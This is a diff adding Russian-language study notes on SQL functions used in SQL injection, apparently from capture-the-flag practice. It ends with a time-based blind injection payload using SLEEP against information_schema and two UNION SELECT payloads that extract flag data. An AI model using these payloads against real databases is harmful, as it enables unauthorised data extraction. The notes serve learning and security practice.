@@ -1,0 +1,18 @@
+25 – символ «%» в UTF-8
+Ascii() – переводит запрос в вид ascii
+Mid(col,begin,end) – отделяет символы строки начиная со второго параметра и заканчивая третьим.
+Cast() – преобразует аутпут в числовое выражение со знаком
+Mod() – возвращает остаток
+substring(строка, начало,длина) -функция,которая извлекает часть данной строки.
+Group_concat() – объединение из нескольких ненулевых строк в одну строку
+Sleep() -–создать задержку,чтобы убедиться,что запрос правильный
+JOIN()- Присоединяет другие запросы к начальному(подзапрос)
+regexp ~approximate name - работает как LIKE и =
+limit(сколько значений надо отступить,  ограничение строчек)
+UNION vs JOIN - UNION добавляет строчки, JOIN добавляет столбцы
+
+case when substring(table_name,1,1) != 'a' then SLEEP(10) else 0 end from information_schema.tables where table_schema !='information_schema'  (тема для блайнд инъекций)
+
+1337 UNION SELECT * FROM flag JOIN(SELECT '123') as a JOIN(Select'234') as b (JOIN()- Присоединяет другие запросы к начальному(подзапрос))
+
+1337 UNION SELECT id,name,flag from flags where name regexp 1812 and 0239
